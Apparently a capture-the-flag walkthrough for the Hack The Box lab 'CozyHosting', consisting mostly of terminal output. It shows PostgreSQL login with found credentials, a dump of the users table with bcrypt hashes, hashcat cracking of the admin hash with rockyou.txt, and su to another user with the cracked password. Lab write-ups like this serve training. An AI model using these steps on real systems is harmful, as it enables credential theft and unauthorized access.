@@ -1,0 +1,144 @@
+download cloudhosting-0.0.1.jar you can do it with python http.server or nc or move the shell to metasploit ......
+
+you will find creds for postgres https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql
+
+app@cozyhosting:/app$ psql -h 127.0.0.1 -U postgres 
+psql -h 127.0.0.1 -U postgres 
+Password for user postgres: N1NJ10ISONLYONE
+
+psql (14.9 (Ubuntu 14.9-0ubuntu0.22.04.1))
+SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
+Type "help" for help.
+
+postgres=# \list
+\list
+WARNING: terminal is not fully functional
+Press RETURN to continue 
+
+                                   List of databases
+    Name     |  Owner   | Encoding |   Collate   |    Ctype    |   Access privil
+eges   
+-------------+----------+----------+-------------+-------------+----------------
+-------
+ cozyhosting | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
+ postgres    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
+ template0   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres    
+      +
+             |          |          |             |             | postgres=CTc/po
+stgres
+ template1   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres    
+      +
+             |          |          |             |             | postgres=CTc/po
+
+postgres-# \c cozyhosting
+\c cozyhosting
+SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
+You are now connected to database "cozyhosting" as user "postgres".
+
+cozyhosting-# \d
+\d
+WARNING: terminal is not fully functional
+Press RETURN to continue 
+
+              List of relations
+ Schema |     Name     |   Type   |  Owner   
+--------+--------------+----------+----------
+ public | hosts        | table    | postgres
+ public | hosts_id_seq | sequence | postgres
+ public | users        | table    | postgres
+(3 rows)
+
+cozyhosting=# select * from users;
+select * from users;
+WARNING: terminal is not fully functional
+Press RETURN to continue 
+
+   name    |                           password                           | role
+  
+-----------+--------------------------------------------------------------+-----
+--
+ kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
+ admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
+
+┌──(root㉿N1NJ10)-[~/HTB/easy_trash]
+└─# hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt 
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 4.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+==================================================================================================================================================
+* Device #1: cpu-sandybridge-Intel(R) Core(TM) i7-8550U CPU @ 1.80GHz, 2913/5890 MB (1024 MB allocatable), 3MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 72
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Single-Hash
+* Single-Salt
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 0 MB
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+Cracking performance lower than expected?                 
+
+* Append -w 3 to the commandline.
+  This can cause your screen to lag.
+
+* Append -S to the commandline.
+  This has a drastic speed impact but can be better for specific attacks.
+  Typical scenarios are a small wordlist but a large ruleset.
+
+* Update your backend API runtime / driver the right way:
+  https://hashcat.net/faq/wrongdriver
+
+* Create more work items to make use of your parallelization power:
+  https://hashcat.net/faq/morework
+
+$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:N1NJ10WASHERE
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
+Hash.Target......: $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib...kVO8dm
+Time.Started.....: Thu Dec 28 21:32:48 2023 (1 min, 17 secs)
+Time.Estimated...: Thu Dec 28 21:34:05 2023 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:       37 H/s (2.49ms) @ Accel:3 Loops:16 Thr:1 Vec:1
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 2799/14344385 (0.02%)
+Rejected.........: 0/2799 (0.00%)
+Restore.Point....: 2790/14344385 (0.02%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1008-1024
+Candidate.Engine.: Device Generator
+Candidates.#1....: dougie -> mercury
+Hardware.Mon.#1..: Util: 97%
+
+Started: Thu Dec 28 21:32:35 2023
+Stopped: Thu Dec 28 21:34:07 2023
+
+
+app@cozyhosting:/app$ cd ../home && ls
+josh
+
+app@cozyhosting:/home$ su josh
+su josh
+Password: N1NJ10WASHERE
+
+josh@cozyhosting:/home$ 
+
+
+
+
